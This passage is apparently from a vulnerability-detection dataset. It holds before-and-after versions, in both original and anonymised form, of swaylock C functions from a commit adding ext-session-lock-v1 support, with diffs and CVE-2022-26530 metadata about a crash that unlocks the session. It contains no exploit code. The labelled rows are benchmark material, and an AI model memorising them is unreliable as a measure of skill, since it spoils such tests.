} else if (strcmp(VAR_3, VAR_15.name) == 0) {
struct swaylock_surface *VAR_16 =
calloc(1, sizeof(struct swaylock_surface));
VAR_16->state = VAR_5;
VAR_16->output = wl_registry_bind(VAR_1, VAR_2,
&VAR_15, 3);
VAR_16->output_global_name = VAR_2;
wl_output_add_listener(VAR_16->output, &VAR_17, VAR_16);
wl_list_insert(&VAR_5->surfaces, &VAR_16->link);
if (VAR_5->run_display) {
create_layer_surface(VAR_16);
wl_display_roundtrip(VAR_5->display);
}
}
}",swaywm/swaylock/1d1c75b6316d21933069a9d201f966d84099f6ca/main.c/vul/before/0.json,"static void handle_global(void *data, struct wl_registry *registry,
		uint32_t name, const char *interface, uint32_t version) {
	struct swaylock_state *state = data;
	if (strcmp(interface, wl_compositor_interface.name) == 0) {
		state->compositor = wl_registry_bind(registry, name,
				&wl_compositor_interface, 4);
	} else if (strcmp(interface, wl_subcompositor_interface.name) == 0) {
		state->subcompositor = wl_registry_bind(registry, name,
				&wl_subcompositor_interface, 1);
	} else if (strcmp(interface, wl_shm_interface.name) == 0) {
		state->shm = wl_registry_bind(registry, name,
				&wl_shm_interface, 1);
	} else if (strcmp(interface, wl_seat_interface.name) == 0) {
		struct wl_seat *seat = wl_registry_bind(
				registry, name, &wl_seat_interface, 4);
		struct swaylock_seat *swaylock_seat =
			calloc(1, sizeof(struct swaylock_seat));
		swaylock_seat->state = state;
		wl_seat_add_listener(seat, &seat_listener, swaylock_seat);
	} else if (strcmp(interface, zwlr_layer_shell_v1_interface.name) == 0) {
		state->layer_shell = wl_registry_bind(
				registry, name, &zwlr_layer_shell_v1_interface, 1);
	} else if (strcmp(interface, zwlr_input_inhibit_manager_v1_interface.name) == 0) {
		state->input_inhibit_manager = wl_registry_bind(
				registry, name, &zwlr_input_inhibit_manager_v1_interface, 1);
	} else if (strcmp(interface, zxdg_output_manager_v1_interface.name) == 0) {
		state->zxdg_output_manager = wl_registry_bind(
				registry, name, &zxdg_output_manager_v1_interface, 2);
	} else if (strcmp(interface, wl_output_interface.name) == 0) {
		struct swaylock_surface *surface =
			calloc(1, sizeof(struct swaylock_surface));
		surface->state = state;
		surface->output = wl_registry_bind(registry, name,
				&wl_output_interface, 3);
		surface->output_global_name = name;
		wl_output_add_listener(surface->output, &_wl_output_listener, surface);
		wl_list_insert(&state->surfaces, &surface->link);

		if (state->run_display) {
			create_surface(surface);
			wl_display_roundtrip(state->display);
		}
	} else if (strcmp(interface, ext_session_lock_manager_v1_interface.name) == 0) {
		state->ext_session_lock_manager_v1 = wl_registry_bind(registry, name,
				&ext_session_lock_manager_v1_interface, 1);
	}
}","static void handle_global(void *VAR_0, struct wl_registry *VAR_1,
		uint32_t VAR_2, const char *VAR_3, uint32_t VAR_4) {
	struct swaylock_state *VAR_5 = VAR_0;
	if (strcmp(VAR_3, VAR_6.name) == 0) {
		VAR_5->compositor = wl_registry_bind(VAR_1, VAR_2,
				&VAR_6, 4);
	} else if (strcmp(VAR_3, VAR_7.name) == 0) {
		VAR_5->subcompositor = wl_registry_bind(VAR_1, VAR_2,
				&VAR_7, 1);
	} else if (strcmp(VAR_3, VAR_8.name) == 0) {
		VAR_5->shm = wl_registry_bind(VAR_1, VAR_2,
				&VAR_8, 1);
	} else if (strcmp(VAR_3, VAR_9.name) == 0) {
		struct wl_seat *VAR_10 = wl_registry_bind(
				VAR_1, VAR_2, &VAR_9, 4);
		struct swaylock_seat *swaylock_seat =
			calloc(1, sizeof(struct swaylock_seat));
		swaylock_seat->state = VAR_5;
		wl_seat_add_listener(VAR_10, &VAR_11, swaylock_seat);
	} else if (strcmp(VAR_3, VAR_12.name) == 0) {
		VAR_5->layer_shell = wl_registry_bind(
				VAR_1, VAR_2, &VAR_12, 1);
	} else if (strcmp(VAR_3, VAR_13.name) == 0) {
		VAR_5->input_inhibit_manager = wl_registry_bind(
				VAR_1, VAR_2, &VAR_13, 1);
	} else if (strcmp(VAR_3, VAR_14.name) == 0) {
		VAR_5->zxdg_output_manager = wl_registry_bind(
				VAR_1, VAR_2, &VAR_14, 2);
	} else if (strcmp(VAR_3, VAR_15.name) == 0) {
		struct swaylock_surface *VAR_16 =
			calloc(1, sizeof(struct swaylock_surface));
		VAR_16->state = VAR_5;
		VAR_16->output = wl_registry_bind(VAR_1, VAR_2,
				&VAR_15, 3);
		VAR_16->output_global_name = VAR_2;
		wl_output_add_listener(VAR_16->output, &VAR_17, VAR_16);
		wl_list_insert(&VAR_5->surfaces, &VAR_16->link);

		if (VAR_5->run_display) {
			create_surface(VAR_16);
			wl_display_roundtrip(VAR_5->display);
		}
	} else if (strcmp(VAR_3, VAR_18.name) == 0) {
		VAR_5->ext_session_lock_manager_v1 = wl_registry_bind(VAR_1, VAR_2,
				&VAR_18, 1);
	}
}",swaywm/swaylock/1d1c75b6316d21933069a9d201f966d84099f6ca/main.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -37,8 +37,11 @@
 		wl_list_insert(&state->surfaces, &surface->link);
 
 		if (state->run_display) {
-			create_layer_surface(surface);
+			create_surface(surface);
 			wl_display_roundtrip(state->display);
 		}
+	} else if (strcmp(interface, ext_session_lock_manager_v1_interface.name) == 0) {
+		state->ext_session_lock_manager_v1 = wl_registry_bind(registry, name,
+				&ext_session_lock_manager_v1_interface, 1);
 	}
 }","{'deleted_lines': ['\t\t\tcreate_layer_surface(surface);'], 'added_lines': ['\t\t\tcreate_surface(surface);', '\t} else if (strcmp(interface, ext_session_lock_manager_v1_interface.name) == 0) {', '\t\tstate->ext_session_lock_manager_v1 = wl_registry_bind(registry, name,', '\t\t\t\t&ext_session_lock_manager_v1_interface, 1);']}",True,swaylock before 1.6 allows attackers to trigger a crash and achieve unlocked access to a Wayland compositor.,9.1,CRITICAL,3,valid,2021-12-20T16:25:44Z,4
CVE-2022-26530,['CWE-Other'],AV:N/AC:L/Au:N/C:P/I:N/A:P,0,swaywm/swaylock,"Add support for ext-session-lock-v1

This is a new protocol to lock the session [1]. It should be more
reliable than layer-shell + input-inhibitor.

[1]: https://gitlab.freedesktop.org/wayland/wayland-protocols/-/merge_requests/131",1d1c75b6316d21933069a9d201f966d84099f6ca,https://github.com/swaywm/swaylock/commit/1d1c75b6316d21933069a9d201f966d84099f6ca,main.c,main,"int main(int argc, char **argv) {
swaylock_log_init(LOG_ERROR);
initialize_pw_backend(argc, argv);
srand(time(NULL));
enum line_mode line_mode = LM_LINE;
state.failed_attempts = 0;
state.args = (struct swaylock_args){
.mode = BACKGROUND_MODE_FILL,
.font = strdup(""sans-serif""),
.font_size = 0,
.radius = 50,
.thickness = 10,
.indicator_x_position = 0,
.indicator_y_position = 0,
.override_indicator_x_position = false,
.override_indicator_y_position = false,
.ignore_empty = false,
.show_indicator = true,
.show_caps_lock_indicator = false,
.show_caps_lock_text = true,
.show_keyboard_layout = false,
.hide_keyboard_layout = false,
.show_failed_attempts = false,
.indicator_idle_visible = false
};
wl_list_init(&state.images);
set_default_colors(&state.args.colors);
char *config_path = NULL;
int result = parse_options(argc, argv, NULL, NULL, &config_path);
if (result != 0) {
free(config_path);
return result;
}
if (!config_path) {
config_path = get_config_path();
}
if (config_path) {
swaylock_log(LOG_DEBUG, ""Found config at %s"", config_path);
int config_status = load_config(config_path, &state, &line_mode);
free(config_path);
if (config_status != 0) {
free(state.args.font);
return config_status;
}
}
if (argc > 1) {
swaylock_log(LOG_DEBUG, ""Parsing CLI Args"");
int result = parse_options(argc, argv, &state, &line_mode, NULL);
if (result != 0) {
free(state.args.font);
return result;
}
}
if (line_mode == LM_INSIDE) {
state.args.colors.line = state.args.colors.inside;
} else if (line_mode == LM_RING) {
state.args.colors.line = state.args.colors.ring;
}
#ifdef __linux__
if (mlock(state.password.buffer, sizeof(state.password.buffer)) != 0) {
swaylock_log(LOG_ERROR, ""Unable to mlock() password memory."");
return EXIT_FAILURE;
}
#endif
wl_list_init(&state.surfaces);
state.xkb.context = xkb_context_new(XKB_CONTEXT_NO_FLAGS);
state.display = wl_display_connect(NULL);
if (!state.display) {
free(state.args.font);
swaylock_log(LOG_ERROR, ""Unable to connect to the compositor. ""
""If your compositor is running, check or set the ""
""WAYLAND_DISPLAY environment variable."");
return EXIT_FAILURE;
}
struct wl_registry *registry = wl_display_get_registry(state.display);
wl_registry_add_listener(registry, &registry_listener, &state);
wl_display_roundtrip(state.display);
assert(state.compositor && state.layer_shell && state.shm);
if (!state.input_inhibit_manager) {
free(state.args.font);
swaylock_log(LOG_ERROR, ""Compositor does not support the input ""
""inhibitor protocol, refusing to run insecurely"");
return 1;
}
zwlr_input_inhibit_manager_v1_get_inhibitor(state.input_inhibit_manager);
if (wl_display_roundtrip(state.display) == -1) {
free(state.args.font);
swaylock_log(LOG_ERROR, ""Exiting - failed to inhibit input:""
"" is another lockscreen already running?"");
return 2;
}
if (state.zxdg_output_manager) {
struct swaylock_surface *surface;
wl_list_for_each(surface, &state.surfaces, link) {
surface->xdg_output = zxdg_output_manager_v1_get_xdg_output(
state.zxdg_output_manager, surface->output);
zxdg_output_v1_add_listener(
surface->xdg_output, &_xdg_output_listener, surface);
}
wl_display_roundtrip(state.display);
} else {
swaylock_log(LOG_INFO, ""Compositor does not support zxdg output ""
""manager, images assigned to named outputs will not work"");
}
struct swaylock_surface *surface;
wl_list_for_each(surface, &state.surfaces, link) {
create_layer_surface(surface);
}
if (state.args.daemonize) {
wl_display_roundtrip(state.display);
daemonize();
}
state.eventloop = loop_create();
loop_add_fd(state.eventloop, wl_display_get_fd(state.display), POLLIN,
display_in, NULL);
loop_add_fd(state.eventloop, get_comm_reply_fd(), POLLIN, comm_in, NULL);
state.run_display = true;
while (state.run_display) {
errno = 0;
if (wl_display_flush(state.display) == -1 && errno != EAGAIN) {
break;
}
loop_poll(state.eventloop);
}
free(state.args.font);
return 0;
}","int main(int VAR_0, char **VAR_1) {
swaylock_log_init(VAR_2);
initialize_pw_backend(VAR_0, VAR_1);
srand(time(NULL));
enum line_mode line_mode = VAR_3;
VAR_4.failed_attempts = 0;
VAR_4.args = (struct swaylock_args){
.mode = VAR_5,
.font = strdup(""sans-serif""),
.font_size = 0,
.radius = 50,
.thickness = 10,
.indicator_x_position = 0,
.indicator_y_position = 0,
.override_indicator_x_position = false,
.override_indicator_y_position = false,
.ignore_empty = false,
.show_indicator = true,
.show_caps_lock_indicator = false,
.show_caps_lock_text = true,
.show_keyboard_layout = false,
.hide_keyboard_layout = false,
.show_failed_attempts = false,
.indicator_idle_visible = false
};
wl_list_init(&VAR_4.images);
set_default_colors(&VAR_4.args.colors);
char *VAR_6 = NULL;
int VAR_7 = parse_options(VAR_0, VAR_1, NULL, NULL, &VAR_6);
if (VAR_7 != 0) {
free(VAR_6);
return VAR_7;
}
if (!VAR_6) {
VAR_6 = get_config_path();
}
if (VAR_6) {
swaylock_log(VAR_8, ""Found config at %s"", VAR_6);
int VAR_9 = load_config(VAR_6, &VAR_4, &line_mode);
free(VAR_6);
if (VAR_9 != 0) {
free(VAR_4.args.font);
return VAR_9;
}
}
if (VAR_0 > 1) {
swaylock_log(VAR_8, ""Parsing CLI Args"");
int VAR_7 = parse_options(VAR_0, VAR_1, &VAR_4, &line_mode, NULL);
if (VAR_7 != 0) {
free(VAR_4.args.font);
return VAR_7;
}
}
if (line_mode == VAR_10) {
VAR_4.args.colors.line = VAR_4.args.colors.inside;
} else if (line_mode == VAR_11) {
VAR_4.args.colors.line = VAR_4.args.colors.ring;
}
#ifdef VAR_12
if (mlock(VAR_4.password.buffer, sizeof(VAR_4.password.buffer)) != 0) {
swaylock_log(VAR_2, ""Unable to mlock() password memory."");
return VAR_13;
}
#endif
wl_list_init(&VAR_4.surfaces);
VAR_4.xkb.context = xkb_context_new(VAR_14);
VAR_4.display = wl_display_connect(NULL);
if (!VAR_4.display) {
free(VAR_4.args.font);
swaylock_log(VAR_2, ""Unable to connect to the compositor. ""
""If your compositor is running, check or set the ""
""WAYLAND_DISPLAY environment variable."");
return VAR_13;
}
struct wl_registry *VAR_15 = wl_display_get_registry(VAR_4.display);
wl_registry_add_listener(VAR_15, &VAR_16, &VAR_4);
wl_display_roundtrip(VAR_4.display);
assert(VAR_4.compositor && VAR_4.layer_shell && VAR_4.shm);
if (!VAR_4.input_inhibit_manager) {
free(VAR_4.args.font);
swaylock_log(VAR_2, ""Compositor does not support the input ""
""inhibitor protocol, refusing to run insecurely"");
return 1;
}
zwlr_input_inhibit_manager_v1_get_inhibitor(VAR_4.input_inhibit_manager);
if (wl_display_roundtrip(VAR_4.display) == -1) {
free(VAR_4.args.font);
swaylock_log(VAR_2, ""Exiting - failed to inhibit input:""
"" is another lockscreen already running?"");
return 2;
}
if (VAR_4.zxdg_output_manager) {
struct swaylock_surface *VAR_17;
wl_list_for_each(VAR_17, &VAR_4.surfaces, VAR_18) {
VAR_17->xdg_output = zxdg_output_manager_v1_get_xdg_output(
VAR_4.zxdg_output_manager, VAR_17->output);
zxdg_output_v1_add_listener(
VAR_17->xdg_output, &VAR_19, VAR_17);
}
wl_display_roundtrip(VAR_4.display);
} else {
swaylock_log(VAR_20, ""Compositor does not support zxdg output ""
""manager, images assigned to named outputs will not work"");
}
struct swaylock_surface *VAR_17;
wl_list_for_each(VAR_17, &VAR_4.surfaces, VAR_18) {
create_layer_surface(VAR_17);
}
if (VAR_4.args.daemonize) {
wl_display_roundtrip(VAR_4.display);
daemonize();
}
VAR_4.eventloop = loop_create();
loop_add_fd(VAR_4.eventloop, wl_display_get_fd(VAR_4.display), VAR_21,
VAR_22, NULL);
loop_add_fd(VAR_4.eventloop, get_comm_reply_fd(), VAR_21, VAR_23, NULL);
VAR_4.run_display = true;
while (VAR_4.run_display) {
VAR_24 = 0;
if (wl_display_flush(VAR_4.display) == -1 && VAR_24 != VAR_25) {
break;
}
loop_poll(VAR_4.eventloop);
}
free(VAR_4.args.font);
return 0;
}",swaywm/swaylock/1d1c75b6316d21933069a9d201f966d84099f6ca/main.c/vul/before/1.json,"int main(int argc, char **argv) {
	swaylock_log_init(LOG_ERROR);
	initialize_pw_backend(argc, argv);
	srand(time(NULL));

	enum line_mode line_mode = LM_LINE;
	state.failed_attempts = 0;
	state.args = (struct swaylock_args){
		.mode = BACKGROUND_MODE_FILL,
		.font = strdup(""sans-serif""),
		.font_size = 0,
		.radius = 50,
		.thickness = 10,
		.indicator_x_position = 0,
		.indicator_y_position = 0,
		.override_indicator_x_position = false,
		.override_indicator_y_position = false,
		.ignore_empty = false,
		.show_indicator = true,
		.show_caps_lock_indicator = false,
		.show_caps_lock_text = true,
		.show_keyboard_layout = false,
		.hide_keyboard_layout = false,
		.show_failed_attempts = false,
		.indicator_idle_visible = false
	};
	wl_list_init(&state.images);
	set_default_colors(&state.args.colors);

	char *config_path = NULL;
	int result = parse_options(argc, argv, NULL, NULL, &config_path);
	if (result != 0) {
		free(config_path);
		return result;
	}
	if (!config_path) {
		config_path = get_config_path();
	}

	if (config_path) {
		swaylock_log(LOG_DEBUG, ""Found config at %s"", config_path);
		int config_status = load_config(config_path, &state, &line_mode);
		free(config_path);
		if (config_status != 0) {
			free(state.args.font);
			return config_status;
		}
	}

	if (argc > 1) {
		swaylock_log(LOG_DEBUG, ""Parsing CLI Args"");
		int result = parse_options(argc, argv, &state, &line_mode, NULL);
		if (result != 0) {
			free(state.args.font);
			return result;
		}
	}

	if (line_mode == LM_INSIDE) {
		state.args.colors.line = state.args.colors.inside;
	} else if (line_mode == LM_RING) {
		state.args.colors.line = state.args.colors.ring;
	}

#ifdef __linux__
	// Most non-linux platforms require root to mlock()
	if (mlock(state.password.buffer, sizeof(state.password.buffer)) != 0) {
		swaylock_log(LOG_ERROR, ""Unable to mlock() password memory."");
		return EXIT_FAILURE;
	}
#endif

	wl_list_init(&state.surfaces);
	state.xkb.context = xkb_context_new(XKB_CONTEXT_NO_FLAGS);
	state.display = wl_display_connect(NULL);
	if (!state.display) {
		free(state.args.font);
		swaylock_log(LOG_ERROR, ""Unable to connect to the compositor. ""
				""If your compositor is running, check or set the ""
				""WAYLAND_DISPLAY environment variable."");
		return EXIT_FAILURE;
	}

	struct wl_registry *registry = wl_display_get_registry(state.display);
	wl_registry_add_listener(registry, &registry_listener, &state);
	wl_display_roundtrip(state.display);

	if (!state.compositor || !state.shm) {
		swaylock_log(LOG_ERROR, ""Missing wl_compositor or wl_shm"");
		return 1;
	}

	if (state.ext_session_lock_manager_v1) {
		swaylock_log(LOG_DEBUG, ""Using ext-session-lock-v1"");
		state.ext_session_lock_v1 = ext_session_lock_manager_v1_lock(state.ext_session_lock_manager_v1);
		ext_session_lock_v1_add_listener(state.ext_session_lock_v1,
				&ext_session_lock_v1_listener, &state);
	} else if (state.layer_shell && state.input_inhibit_manager) {
		swaylock_log(LOG_DEBUG, ""Using wlr-layer-shell + wlr-input-inhibitor"");
		zwlr_input_inhibit_manager_v1_get_inhibitor(state.input_inhibit_manager);
	} else {
		swaylock_log(LOG_ERROR, ""Missing ext-session-lock-v1, wlr-layer-shell ""
				""and wlr-input-inhibitor"");
		return 1;
	}

	if (wl_display_roundtrip(state.display) == -1) {
		free(state.args.font);
		if (state.input_inhibit_manager) {
			swaylock_log(LOG_ERROR, ""Exiting - failed to inhibit input:""
					"" is another lockscreen already running?"");
			return 2;
		}
		return 1;
	}

	if (state.zxdg_output_manager) {
		struct swaylock_surface *surface;
		wl_list_for_each(surface, &state.surfaces, link) {
			surface->xdg_output = zxdg_output_manager_v1_get_xdg_output(
						state.zxdg_output_manager, surface->output);
			zxdg_output_v1_add_listener(
					surface->xdg_output, &_xdg_output_listener, surface);
		}
		wl_display_roundtrip(state.display);
	} else {
		swaylock_log(LOG_INFO, ""Compositor does not support zxdg output ""
				""manager, images assigned to named outputs will not work"");
	}

	struct swaylock_surface *surface;
	wl_list_for_each(surface, &state.surfaces, link) {
		create_surface(surface);
	}

	if (state.args.daemonize) {
		wl_display_roundtrip(state.display);
		daemonize();
	}

	state.eventloop = loop_create();
	loop_add_fd(state.eventloop, wl_display_get_fd(state.display), POLLIN,
			display_in, NULL);

	loop_add_fd(state.eventloop, get_comm_reply_fd(), POLLIN, comm_in, NULL);

	state.run_display = true;
	while (state.run_display) {
		errno = 0;
		if (wl_display_flush(state.display) == -1 && errno != EAGAIN) {
			break;
		}
		loop_poll(state.eventloop);
	}

	if (state.ext_session_lock_v1) {
		ext_session_lock_v1_unlock_and_destroy(state.ext_session_lock_v1);
		wl_display_flush(state.display);
	}

	free(state.args.font);
	return 0;
}","int main(int VAR_0, char **VAR_1) {
	swaylock_log_init(VAR_2);
	initialize_pw_backend(VAR_0, VAR_1);
	srand(time(NULL));

	enum line_mode line_mode = VAR_3;
	VAR_4.failed_attempts = 0;
	VAR_4.args = (struct swaylock_args){
		.mode = VAR_5,
		.font = strdup(""sans-serif""),
		.font_size = 0,
		.radius = 50,
		.thickness = 10,
		.indicator_x_position = 0,
		.indicator_y_position = 0,
		.override_indicator_x_position = false,
		.override_indicator_y_position = false,
		.ignore_empty = false,
		.show_indicator = true,
		.show_caps_lock_indicator = false,
		.show_caps_lock_text = true,
		.show_keyboard_layout = false,
		.hide_keyboard_layout = false,
		.show_failed_attempts = false,
		.indicator_idle_visible = false
	};
	wl_list_init(&VAR_4.images);
	set_default_colors(&VAR_4.args.colors);

	char *VAR_6 = NULL;
	int VAR_7 = parse_options(VAR_0, VAR_1, NULL, NULL, &VAR_6);
	if (VAR_7 != 0) {
		free(VAR_6);
		return VAR_7;
	}
	if (!VAR_6) {
		VAR_6 = get_config_path();
	}

	if (VAR_6) {
		swaylock_log(VAR_8, ""Found config at %s"", VAR_6);
		int VAR_9 = load_config(VAR_6, &VAR_4, &line_mode);
		free(VAR_6);
		if (VAR_9 != 0) {
			free(VAR_4.args.font);
			return VAR_9;
		}
	}

	if (VAR_0 > 1) {
		swaylock_log(VAR_8, ""Parsing CLI Args"");
		int VAR_7 = parse_options(VAR_0, VAR_1, &VAR_4, &line_mode, NULL);
		if (VAR_7 != 0) {
			free(VAR_4.args.font);
			return VAR_7;
		}
	}

	if (line_mode == VAR_10) {
		VAR_4.args.colors.line = VAR_4.args.colors.inside;
	} else if (line_mode == VAR_11) {
		VAR_4.args.colors.line = VAR_4.args.colors.ring;
	}

#ifdef VAR_12
	/* COMMENT_0 */
	if (mlock(VAR_4.password.buffer, sizeof(VAR_4.password.buffer)) != 0) {
		swaylock_log(VAR_2, ""Unable to mlock() password memory."");
		return VAR_13;
	}
#endif

	wl_list_init(&VAR_4.surfaces);
	VAR_4.xkb.context = xkb_context_new(VAR_14);
	VAR_4.display = wl_display_connect(NULL);
	if (!VAR_4.display) {
		free(VAR_4.args.font);
		swaylock_log(VAR_2, ""Unable to connect to the compositor. ""
				""If your compositor is running, check or set the ""
				""WAYLAND_DISPLAY environment variable."");
		return VAR_13;
	}

	struct wl_registry *VAR_15 = wl_display_get_registry(VAR_4.display);
	wl_registry_add_listener(VAR_15, &VAR_16, &VAR_4);
	wl_display_roundtrip(VAR_4.display);

	if (!VAR_4.compositor || !VAR_4.shm) {
		swaylock_log(VAR_2, ""Missing wl_compositor or wl_shm"");
		return 1;
	}

	if (VAR_4.ext_session_lock_manager_v1) {
		swaylock_log(VAR_8, ""Using ext-session-lock-v1"");
		VAR_4.ext_session_lock_v1 = ext_session_lock_manager_v1_lock(VAR_4.ext_session_lock_manager_v1);
		ext_session_lock_v1_add_listener(VAR_4.ext_session_lock_v1,
				&VAR_17, &VAR_4);
	} else if (VAR_4.layer_shell && VAR_4.input_inhibit_manager) {
		swaylock_log(VAR_8, ""Using wlr-layer-shell + wlr-input-inhibitor"");
		zwlr_input_inhibit_manager_v1_get_inhibitor(VAR_4.input_inhibit_manager);
	} else {
		swaylock_log(VAR_2, ""Missing ext-session-lock-v1, wlr-layer-shell ""
				""and wlr-input-inhibitor"");
		return 1;
	}

	if (wl_display_roundtrip(VAR_4.display) == -1) {
		free(VAR_4.args.font);
		if (VAR_4.input_inhibit_manager) {
			swaylock_log(VAR_2, ""Exiting - failed to inhibit input:""
					"" is another lockscreen already running?"");
			return 2;
		}
		return 1;
	}

	if (VAR_4.zxdg_output_manager) {
		struct swaylock_surface *VAR_18;
		wl_list_for_each(VAR_18, &VAR_4.surfaces, VAR_19) {
			VAR_18->xdg_output = zxdg_output_manager_v1_get_xdg_output(
						VAR_4.zxdg_output_manager, VAR_18->output);
			zxdg_output_v1_add_listener(
					VAR_18->xdg_output, &VAR_20, VAR_18);
		}
		wl_display_roundtrip(VAR_4.display);
	} else {
		swaylock_log(VAR_21, ""Compositor does not support zxdg output ""
				""manager, images assigned to named outputs will not work"");
	}

	struct swaylock_surface *VAR_18;
	wl_list_for_each(VAR_18, &VAR_4.surfaces, VAR_19) {
		create_surface(VAR_18);
	}

	if (VAR_4.args.daemonize) {
		wl_display_roundtrip(VAR_4.display);
		daemonize();
	}

	VAR_4.eventloop = loop_create();
	loop_add_fd(VAR_4.eventloop, wl_display_get_fd(VAR_4.display), VAR_22,
			VAR_23, NULL);

	loop_add_fd(VAR_4.eventloop, get_comm_reply_fd(), VAR_22, VAR_24, NULL);

	VAR_4.run_display = true;
	while (VAR_4.run_display) {
		VAR_25 = 0;
		if (wl_display_flush(VAR_4.display) == -1 && VAR_25 != VAR_26) {
			break;
		}
		loop_poll(VAR_4.eventloop);
	}

	if (VAR_4.ext_session_lock_v1) {
		ext_session_lock_v1_unlock_and_destroy(VAR_4.ext_session_lock_v1);
		wl_display_flush(VAR_4.display);
	}

	free(VAR_4.args.font);
	return 0;
}",swaywm/swaylock/1d1c75b6316d21933069a9d201f966d84099f6ca/main.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -84,20 +84,34 @@
 	struct wl_registry *registry = wl_display_get_registry(state.display);
 	wl_registry_add_listener(registry, &registry_listener, &state);
 	wl_display_roundtrip(state.display);
-	assert(state.compositor && state.layer_shell && state.shm);
-	if (!state.input_inhibit_manager) {
-		free(state.args.font);
-		swaylock_log(LOG_ERROR, ""Compositor does not support the input ""
-				""inhibitor protocol, refusing to run insecurely"");
+
+	if (!state.compositor || !state.shm) {
+		swaylock_log(LOG_ERROR, ""Missing wl_compositor or wl_shm"");
 		return 1;
 	}
 
-	zwlr_input_inhibit_manager_v1_get_inhibitor(state.input_inhibit_manager);
+	if (state.ext_session_lock_manager_v1) {
+		swaylock_log(LOG_DEBUG, ""Using ext-session-lock-v1"");
+		state.ext_session_lock_v1 = ext_session_lock_manager_v1_lock(state.ext_session_lock_manager_v1);
+		ext_session_lock_v1_add_listener(state.ext_session_lock_v1,
+				&ext_session_lock_v1_listener, &state);
+	} else if (state.layer_shell && state.input_inhibit_manager) {
+		swaylock_log(LOG_DEBUG, ""Using wlr-layer-shell + wlr-input-inhibitor"");
+		zwlr_input_inhibit_manager_v1_get_inhibitor(state.input_inhibit_manager);
+	} else {
+		swaylock_log(LOG_ERROR, ""Missing ext-session-lock-v1, wlr-layer-shell ""
+				""and wlr-input-inhibitor"");
+		return 1;
+	}
+
 	if (wl_display_roundtrip(state.display) == -1) {
 		free(state.args.font);
-		swaylock_log(LOG_ERROR, ""Exiting - failed to inhibit input:""
-				"" is another lockscreen already running?"");
-		return 2;
+		if (state.input_inhibit_manager) {
+			swaylock_log(LOG_ERROR, ""Exiting - failed to inhibit input:""
+					"" is another lockscreen already running?"");
+			return 2;
+		}
+		return 1;
 	}
 
 	if (state.zxdg_output_manager) {
@@ -116,7 +130,7 @@
 
 	struct swaylock_surface *surface;
 	wl_list_for_each(surface, &state.surfaces, link) {
-		create_layer_surface(surface);
+		create_surface(surface);
 	}
 
 	if (state.args.daemonize) {
@@ -139,6 +153,11 @@
 		loop_poll(state.eventloop);
 	}
 
+	if (state.ext_session_lock_v1) {
+		ext_session_lock_v1_unlock_and_destroy(state.ext_session_lock_v1);
+		wl_display_flush(state.display);
+	}
+
 	free(state.args.font);
 	return 0;
 }","{'deleted_lines': ['\tassert(state.compositor && state.layer_shell && state.shm);', '\tif (!state.input_inhibit_manager) {', '\t\tfree(state.args.font);', '\t\tswaylock_log(LOG_ERROR, ""Compositor does not support the input ""', '\t\t\t\t""inhibitor protocol, refusing to run insecurely"");', '\tzwlr_input_inhibit_manager_v1_get_inhibitor(state.input_inhibit_manager);', '\t\tswaylock_log(LOG_ERROR, ""Exiting - failed to inhibit input:""', '\t\t\t\t"" is another lockscreen already running?"");', '\t\treturn 2;', '\t\tcreate_layer_surface(surface);'], 'added_lines': ['', '\tif (!state.compositor || !state.shm) {', '\t\tswaylock_log(LOG_ERROR, ""Missing wl_compositor or wl_shm"");', '\tif (state.ext_session_lock_manager_v1) {', '\t\tswaylock_log(LOG_DEBUG, ""Using ext-session-lock-v1"");', '\t\tstate.ext_session_lock_v1 = ext_session_lock_manager_v1_lock(state.ext_session_lock_manager_v1);', '\t\text_session_lock_v1_add_listener(state.ext_session_lock_v1,', '\t\t\t\t&ext_session_lock_v1_listener, &state);', '\t} else if (state.layer_shell && state.input_inhibit_manager) {', '\t\tswaylock_log(LOG_DEBUG, ""Using wlr-layer-shell + wlr-input-inhibitor"");', '\t\tzwlr_input_inhibit_manager_v1_get_inhibitor(state.input_inhibit_manager);', '\t} else {', '\t\tswaylock_log(LOG_ERROR, ""Missing ext-session-lock-v1, wlr-layer-shell ""', '\t\t\t\t""and wlr-input-inhibitor"");', '\t\treturn 1;', '\t}', '', '\t\tif (state.input_inhibit_manager) {', '\t\t\tswaylock_log(LOG_ERROR, ""Exiting - failed to inhibit input:""', '\t\t\t\t\t"" is another lockscreen already running?"");', '\t\t\treturn 2;', '\t\t}', '\t\treturn 1;', '\t\tcreate_surface(surface);', '\tif (state.ext_session_lock_v1) {', '\t\text_session_lock_v1_unlock_and_destroy(state.ext_session_lock_v1);', '\t\twl_display_flush(state.display);', '\t}', '']}",True,swaylock before 1.6 allows attackers to trigger a crash and achieve unlocked access to a Wayland compositor.,9.1,CRITICAL,3,valid,2021-12-20T16:25:44Z,4
CVE-2022-26530,['CWE-Other'],AV:N/AC:L/Au:N/C:P/I:N/A:P,0,swaywm/swaylock,"Add support for ext-session-lock-v1

This is a new protocol to lock the session [1]. It should be more
reliable than layer-shell + input-inhibitor.

[1]: https://gitlab.freedesktop.org/wayland/wayland-protocols/-/merge_requests/131",1d1c75b6316d21933069a9d201f966d84099f6ca,https://github.com/swaywm/swaylock/commit/1d1c75b6316d21933069a9d201f966d84099f6ca,main.c,destroy_surface,"static void destroy_surface(struct swaylock_surface *surface) {
wl_list_remove(&surface->link);
if (surface->layer_surface != NULL) {
zwlr_layer_surface_v1_destroy(surface->layer_surface);
}
if (surface->surface != NULL) {
wl_surface_destroy(surface->surface);
}
destroy_buffer(&surface->buffers[0]);
destroy_buffer(&surface->buffers[1]);
destroy_buffer(&surface->indicator_buffers[0]);
destroy_buffer(&surface->indicator_buffers[1]);
wl_output_destroy(surface->output);
free(surface);
}","static void destroy_surface(struct swaylock_surface *VAR_0) {
wl_list_remove(&VAR_0->link);
if (VAR_0->layer_surface != NULL) {
zwlr_layer_surface_v1_destroy(VAR_0->layer_surface);
}
if (VAR_0->surface != NULL) {
wl_surface_destroy(VAR_0->surface);
}
destroy_buffer(&VAR_0->buffers[0]);
destroy_buffer(&VAR_0->buffers[1]);
destroy_buffer(&VAR_0->indicator_buffers[0]);
destroy_buffer(&VAR_0->indicator_buffers[1]);
wl_output_destroy(VAR_0->output);
free(VAR_0);
}",swaywm/swaylock/1d1c75b6316d21933069a9d201f966d84099f6ca/main.c/vul/before/2.json,"static void destroy_surface(struct swaylock_surface *surface) {
	wl_list_remove(&surface->link);
	if (surface->layer_surface != NULL) {
		zwlr_layer_surface_v1_destroy(surface->layer_surface);
	}
	if (surface->ext_session_lock_surface_v1 != NULL) {
